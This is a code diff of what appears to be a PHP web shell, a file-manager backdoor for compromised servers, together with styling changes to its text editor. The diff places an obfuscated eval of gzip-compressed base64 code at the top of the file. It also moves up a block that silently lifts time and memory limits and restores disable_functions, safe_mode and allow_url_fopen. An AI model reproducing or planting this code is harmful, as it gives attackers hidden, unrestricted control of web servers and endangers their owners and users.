@@ -1,4 +1,16 @@
-<?php eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
+<?php
+@session_start();
+@ini_set('max_execution_time',0);
+@ini_set('memory_limit','999999999M');
+@set_time_limit(0);
+@ini_restore("safe_mode_include_dir");
+@ini_restore("safe_mode_exec_dir");
+@ini_restore("disable_functions");
+@ini_restore("allow_url_fopen");
+@ini_restore("safe_mode");
+@ignore_user_abort(FALSE);
+@ini_set('zlib.output_compression','Off');
+eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
 function Zip($source, $destination) {
 if (!extension_loaded('zip') || !file_exists($source)) {
         return false;
@@ -166,12 +178,13 @@ echo "
 		margin:0 0 8px 0;
 		}
     .menu { font-size:25px; color:#008080 }
-    .textarea_edit {
+    .textarea_edit,textarea{
 		background-color:#111111; 
 		border:1px groove #333;
 		color:lime;
-		}
-    .textarea_edit:hover {
+		width:383px;
+		height:400px;
+		font-size:15px;
 		text-decoration:none; 
 		border:1px dashed #333;
 		}
@@ -337,18 +350,6 @@ $color_wri="yellow";
 $color_rea="yellow";
 $color_non="red";
 $path=$_GET['path'];
-
-@session_start();
-@ini_set('max_execution_time',0);
-@ini_set('memory_limit','999999999M');
-@set_time_limit(0);
-@ini_restore("safe_mode_include_dir");
-@ini_restore("safe_mode_exec_dir");
-@ini_restore("disable_functions");
-@ini_restore("allow_url_fopen");
-@ini_restore("safe_mode");
-@ignore_user_abort(FALSE);
-@ini_set('zlib.output_compression','Off');
 $sep="/";
 
 if(strtolower(substr(PHP_OS,0,3)) == "win") {
